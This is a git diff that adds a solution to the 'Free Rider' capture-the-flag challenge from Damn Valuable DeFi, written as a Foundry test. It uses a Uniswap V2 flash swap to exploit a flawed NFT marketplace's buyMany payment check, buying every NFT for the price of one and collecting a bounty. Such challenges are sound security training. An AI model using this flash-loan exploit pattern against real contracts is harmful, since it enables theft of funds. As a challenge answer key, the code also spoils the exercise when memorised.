@@ -12,7 +12,9 @@ import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketpl
 import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
-contract FreeRiderChallenge is Test {
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract FreeRiderChallenge is Test, IERC721Receiver {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recoveryManagerOwner = makeAddr("recoveryManagerOwner");
@@ -123,7 +125,39 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
+        uniswapPair.swap(NFT_PRICE, 0, address(this), new bytes(1));
+
+    }
+
+     function uniswapV2Call(
+        address sender,
+        uint amount0,
+        uint amount1,
+        bytes calldata data
+    ) external {
+
+        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
+        for (uint i = 0; i < ids.length; ++i) {
+            ids[i] = i;
+        }
+        weth.withdraw(weth.balanceOf(address(this)));
+        marketplace.buyMany{value: NFT_PRICE}(ids);
+
+        for (uint i = 0; i < ids.length; i++) {
+            nft.safeTransferFrom(address(this),address(recoveryManager), i, abi.encodePacked(bytes32(uint256(uint160(address(player))))));
+        }
         
+        uint amountRequired = (amount0 * 1000) / 997 + 1;
+        weth.deposit{value: amountRequired}();
+        assert(weth.transfer(msg.sender, amountRequired)); // return WETH to V2 pair
+    }
+      function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory _data
+    ) external returns (bytes4) {
+        return this.onERC721Received.selector;
     }
 
     /**
@@ -145,4 +179,5 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+     receive() external payable {}
 }
